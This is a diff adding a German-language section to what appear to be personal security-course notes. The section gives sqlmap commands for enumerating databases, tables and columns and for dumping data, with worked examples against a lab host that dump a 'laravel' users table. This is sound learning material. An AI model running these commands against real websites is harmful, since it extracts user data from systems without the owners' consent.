@@ -632,7 +632,71 @@ exit
 	- Muss in PATH sein
 
 ### Syntax
+- Alles (DBs / Tabellen) auf Website anzeigen(dauert lange):
+```
+sqlmap.py -u [GET-URL] -a
+```
 
+- Alle Daten von einer Tabelle anzeigen:
+```
+sqlmap.py -u [URL mit GET] -D [Databasename] -T [Tablename] --dump
+```
+
+- DBs auf Website anzeigen:
+```
+sqlmap.py -u [GET-URL] --dbs
+```
+
+- Tabellen von bestimmter DB anzeigen:
+```
+sqlmap.py -u [URL mit GET] -D [Databasename] --tables
+```
+
+- Zeilen von bestimmter Tabelle anzeigen:
+```
+sqlmap.py -u [URL mit GET] -D [Databasename] -T [Tablename] --columns
+```
+
+- Daten von bestimmter Zeile anzeigen:
+```
+sqlmap.py -u [URL mit GET] -D [Databasename] -T [Tablename] -C [Columname] --dump
+```
+
+### Beispiel
+1. 
+```
+sqlmap.py -u https://c8d0aa75-b9aa-4935-b206-2b0eaab5ecd5.idocker.vuln.land/space/mkaufmann --dbs
+```
+
+![[CleanShot 2022-09-07 at 11.17.29.png]]
+
+2. 
+```
+sqlmap.py -u https://c8d0aa75-b9aa-4935-b206-2b0eaab5ecd5.idocker.vuln.land/space/mkaufmann -D laravel --tables
+```
+
+![[CleanShot 2022-09-07 at 11.21.10.png]]
+
+3. 
+```
+sqlmap.py -u https://c8d0aa75-b9aa-4935-b206-2b0eaab5ecd5.idocker.vuln.land/space/mkaufmann -D laravel -T users --columns
+```
+
+![[CleanShot 2022-09-07 at 11.28.57.png]]
+
+4. 
+```
+sqlmap.py -u https://c8d0aa75-b9aa-4935-b206-2b0eaab5ecd5.idocker.vuln.land/space/mkaufmann -D laravel -T users -C emails --dump
+```
+
+![[CleanShot 2022-09-07 at 11.42.15.png]]
+
+5. 
+```
+sqlmap.py -u https://c8d0aa75-b9aa-4935-b206-2b0eaab5ecd5.idocker.vuln.land/space/mkaufmann -D laravel -T users --dump
+```
+
+![[CleanShot 2022-09-07 at 12.00.18.png]]
 
 ## fail2ban
 - Intrusion Prevention Tool
